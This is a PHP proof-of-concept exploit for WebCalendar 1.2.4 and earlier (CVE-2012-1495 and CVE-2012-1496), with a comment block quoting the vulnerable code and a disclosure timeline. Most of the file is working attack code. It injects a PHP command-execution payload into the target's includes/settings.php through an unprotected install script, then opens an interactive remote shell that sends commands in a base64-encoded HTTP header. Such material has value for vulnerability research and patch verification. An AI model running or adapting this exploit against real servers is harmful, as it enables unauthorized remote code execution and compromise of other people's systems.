<?php

/*
    -----------------------------------------------------------------------
    WebCalendar <= 1.2.4 (install/index.php) Remote Code Executionn Exploit
    -----------------------------------------------------------------------
    
    author..........: Egidio Romano aka EgiX
    mail............: n0b0d13s[at]gmail[dot]com
    software link...: https://sourceforge.net/projects/webcalendar/

    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+
    
    [-] vulnerable code in /install/index.php (CVE-2012-1495)

    674.    $y = getPostValue ( 'app_settings' );
    675.    if ( ! empty ( $y ) ) {
    676.      $settings['single_user_login'] = getPostValue ( 'form_single_user_login' );
    677.      $settings['readonly'] = getPostValue ( 'form_readonly' );
    ...
    724.      // Save settings to file now.
    725.    if ( ! empty ( $x ) || ! empty ( $y ) ){
    726.      $fd = @fopen ( $file, 'w+b', false );
    727.      if ( empty ( $fd ) ) {
    728.        if ( @file_exists ( $file ) ) {
    729.          $onloadDetailStr =
    730.            translate ( 'Please change the file permissions of this file', true );
    731.        } else {
    732.          $onloadDetailStr =
    733.            translate ( 'Please change includes dir permission', true );
    734.        }
    735.        $onload = "alert('" . $errorFileWriteStr . $file. "\\n" .
    736.          $onloadDetailStr . ".');";
    737.      } else {
    738.        if ( function_exists ( "date_default_timezone_set" ) )
    739.          date_default_timezone_set ( "America/New_York");
    740.        fwrite ( $fd, "<?php\r\n" );
    741.        fwrite ( $fd, '/* updated via install/index.php on ' . date ( 'r' ) . "\r\n" );
    742.        foreach ( $settings as $k => $v ) {
    743.          if ( $v != '<br />' && $v != '' )
    744.          fwrite ( $fd, $k . ': ' . $v . "\r\n" );
    745.        }
    
    Restricted access  to this script isn't  properly realized,  so an attacker might be able
    to  update  /includes/settings.php  with arbitrary  values  or  inject PHP code  into it.
    
    [-] vulnerable code to LFI in /pref.php (CVE-2012-1496)
        
    70.    if ( ! empty ( $_POST ) && empty ( $error )) {
    71.      $my_theme = '';
    72.      $currenttab = getPostValue ( 'currenttab' );
    73.      save_pref ( $_POST, 'post' );
    74.    
    75.      if ( ! empty ( $my_theme ) ) {
    76.        $theme = 'themes/'. $my_theme . '_pref.php';
    77.        include_once $theme;
    78.        save_pref ( $webcal_theme, 'theme' );
    79.      }
    
    Input passed through $_POST['pref_THEME'] isn't properly sanitized  before being assigned
    to $my_theme variable, this can be exploited to include arbitrary local files at line 77.
    Exploitation  of this  vulnerability requires  authentication and magic_quotes_gpc = off.
    
    [-] Disclosure timeline:
    
    [02/10/2011] - Vulnerabilities discovered
    [04/10/2011] - Vendor notified to http://sourceforge.net/support/tracker.php?aid=3418570
    [20/02/2012] - First vendor response
    [28/02/2012] - Vendor fix committed to CVS
    [29/02/2012] - Version 1.2.5 released
    [02/03/2012] - CVE numbers requested
    [02/03/2012] - Assigned CVE-2012-1495 and CVE-2012-1496
    [23/04/2012] - Public disclosure
    
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80))) die( "\n[-] No response from {$host}:80\n");
    fwrite($sock, $packet);
    return stream_get_contents($sock);
}

print "\n+-------------------------------------------------------------+";
print "\n| WebCalendar <= 1.2.4 Remote Code Executionn Exploit by EgiX |";
print "\n+-------------------------------------------------------------+\n";

if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path>\n";
    print "\nExample....: php $argv[0] localhost /";
    print "\nExample....: php $argv[0] localhost /webcalendar/\n";
    die();
}

list($host, $path) = array($argv[1], $argv[2]);

$phpcode = "*/print(____);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die;";
$payload = "app_settings=1&form_user_inc=user.php&form_single_user_login={$phpcode}";

$packet  = "POST {$path}install/index.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";
    
http_send($host, $packet);

$packet  = "GET {$path}includes/settings.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";

while(1)
{
    print "\nwebcalendar-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
    preg_match('/____(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
}